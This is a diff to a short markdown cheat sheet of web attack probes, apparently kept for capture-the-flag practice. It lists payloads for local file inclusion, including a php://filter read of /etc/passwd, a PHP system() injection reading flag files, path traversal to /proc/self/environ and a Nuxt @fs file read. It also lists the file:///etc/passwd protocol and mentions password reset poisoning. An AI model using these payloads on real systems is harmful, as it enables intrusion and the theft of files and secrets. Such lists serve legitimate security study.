@@ -1,9 +1,3 @@
-### Interesting files
-
-- `/robots.txt`
-- `/.git`
-- `/sitemap.xml`
-
 ### Interesting protocols
 
 - `file:///etc/passwd`
@@ -14,11 +8,13 @@
     - Password reset poisoning
 
 ### Local File Inclution
-
-- `?file=php://filter/convert.base64-encode/resource=/etc/passwd`
-- `?file='.system("cat /flag*").'`
-- `../../../../../../proc/self/environ`
-- `/_nuxt/@fs/flag.txt`
+  - `/robots.txt`
+  - `/.git`
+  - `/sitemap.xml`
+  - `?file=php://filter/convert.base64-encode/resource=/etc/passwd`
+  - `?file='.system("cat /flag*").'`
+  - `/../../../../../../proc/self/environ`
+  - `/_nuxt/@fs/flag.txt`
 
 ### SQLi
 
